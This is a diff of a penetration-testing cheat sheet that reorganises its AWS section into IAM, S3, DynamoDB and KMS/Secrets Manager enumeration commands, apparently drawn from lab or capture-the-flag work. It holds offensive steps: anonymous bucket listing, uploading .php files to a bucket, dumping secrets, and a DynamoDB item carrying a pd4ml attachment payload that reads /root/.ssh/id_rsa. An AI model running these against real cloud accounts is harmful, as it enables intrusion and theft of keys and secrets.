@@ -73,121 +73,10 @@ Default region name [None]: us-west-2
 Default output format [None]: json
 ```
 
-### Verification
-
-```console
-$ aws sts get-caller-identity --profile <PROFILE>
-```
-
-### List Buckets
-
-```console
-$ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
-```
-
-### List Tables
-
-```console
-$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
-```
-
-### List Users
-
-```console
-$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
-```
-
-### Upload Files
-
-```console
-$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
-```
-
-### Alternativ Upload Technique
-
-```console
-$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
-```
-
-### Create Table
-
-```console
-$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
-```
-
-### Extract Data into Table
-
-```console
-$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
-```
-
-### List Keys
-
-```console
-$ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
-```
-
-### List Secrets
-
-```console
-$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
-```
-
-### Get Secret Values
-
-```console
-$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
-```
-
-### KMS Enable Key
-
-```console
-$ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
-```
-
-### KMS Decrypt
-
-```console
-$ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
-```
-
-### Abuse Access Control List (ACL) Misconfiguration
-
-```console
-$ aws s3 ls s3://{<BUCKET>} --no-sign-request
-$ aws s3 ls s3://<COMPANY>
-```
-
-### Searching for Usernames in JSON Files
-
-```console
-$ grep -r userName | sort -u
-$ grep -h -A 10 <USERNAME> <FILE>
-```
-
-### Get-Caller-Identity
-
-```console
-$ aws sts get-caller-identity
-```
-
-### Get-User-Policies
-
-```console
-$ aws iam list-user-policies --user-name <USERNAME>
-$ aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY>
-```
-
-### Assume-Role
-
-```console
-$ aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name <SESSION>
-```
-
 ### Set Session Token
 
 ```console
-$ aws configure
+$ aws configure --profile <PROFILE>
 AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 Default region name [None]: us-west-2
@@ -198,24 +87,96 @@ Default output format [None]: json
 $ aws configure set aws_session_token "IQo<--- SNIP --->xY="
 ```
 
-### Access S3 Bucket
+### Common Commands
+
+#### Verification
 
 ```console
-$ aws configure
-AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
-AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-Default region name [None]: us-west-2
-Default output format [None]: json
+$ aws sts get-caller-identity --profile <PROFILE>
 ```
 
+#### Get User
+
 ```console
-$ aws s3 ls s3://<BUCKET>
+$ aws iam get-user --profile <PROFILE>
 ```
 
-### Download from S3 Bucket
+#### List Access Keys
 
 ```console
-$ aws s3 cp s3://<BUCKET>/<FILE> .
+$ aws iam list-access-keys --profile <PROFILE>
+```
+
+#### Get Users
+
+```console
+$ aws iam list-users --profile <PROFILE>
+```
+
+#### List attached Policies
+
+```console
+$ aws iam list-attached-user-policies --user-name "<USERNAME>" --profile <PROFILE>
+```
+
+#### List User Policies
+
+```console
+$ aws iam list-user-policies --user-name "<USERNAME>" --profile <PROFILE>
+```
+
+#### List Groups
+
+```console
+$ aws iam list-groups --profile <PROFILE>
+```
+
+#### List Groups for a specific User
+
+```console
+$ aws iam list-groups-for-user --user-name "<USERNAME>" --profile <PROFILE>
+```
+
+#### Get Groups
+
+```console
+$ aws iam get-group --group-name "<GROUP>" --profile <PROFILE>
+```
+
+#### List Group Policies
+
+```console
+$ aws iam list-group-policies --group-name "<GROUP>" --profile <PROFILE>
+```
+
+#### Get Group Policies
+
+```console
+$ aws iam get-group-policy --group-name "<GROUP>" --policy-name "<POLICY>" --profile <PROFILE>
+```
+
+#### List Roles
+
+```console
+$ aws iam list-roles --profile <PROFILE>
+```
+
+#### List Roles using a Query
+
+```console
+$ aws iam list-roles --query "Roles[?RoleName=='<ROLE>']" --profile <PROFILE>
+```
+
+#### List Role Policies
+
+```console
+$ aws iam list-role-policies --role-name "<ROLE>" --profile <PROFILE>
+```
+
+#### Get Role Policy
+
+```console
+$ aws iam get-role-policy --role-name "<ROLE>" --policy-name <POLICY> --profile <PROFILE>
 ```
 
 ### Identity and Access Management (IAM) Enumeration
@@ -299,6 +260,12 @@ $ aws iam list-role-policies --role-name <ROLE>
 $ aws iam get-role-policy --role-name <ROLE> --policy-name <POLICY>
 ```
 
+##### Assume-Role
+
+```console
+$ aws sts assume-role --role-arn <ROLE> --role-session-name <SESSION>
+```
+
 #### Get and decode Policy Documents
 
 ##### Get a Managed Policy Document (by ARN or Name)
@@ -317,6 +284,97 @@ $ aws iam get-account-authorization-details
 ```
 
 Use this to build a full IAM permissions map. Add `--filter` to target `roles`, `users`, `groups` specifically.
+
+### S3 Bucket Enumeration
+
+#### List Buckets
+
+```console
+$ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
+```
+
+#### Access S3 Bucket
+
+```console
+$ aws s3 ls s3://<BUCKET>
+```
+
+#### Download from S3 Bucket
+
+```console
+$ aws s3 cp s3://<BUCKET>/<FILE> .
+```
+
+#### Upload Files
+
+```console
+$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
+```
+
+#### Alternativ Upload Technique
+
+```console
+$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
+```
+
+### DynamoDB Enumeration
+
+
+#### List Tables
+
+```console
+$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
+```
+
+#### List Users
+
+```console
+$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
+```
+
+#### Create Table
+
+```console
+$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
+```
+
+#### Extract Data into Table
+
+```console
+$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
+```
+
+### Endpoint Enumeration
+
+#### List Keys
+
+```console
+$ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
+```
+
+#### List Secrets
+
+```console
+$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
+```
+
+#### Get Secret Values
+
+```console
+$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
+```
+
+#### KMS Enable Key
+
+```console
+$ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
+```
+
+#### KMS Decrypt
+
+```console
+$ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
+```
 
 ## Entra
 
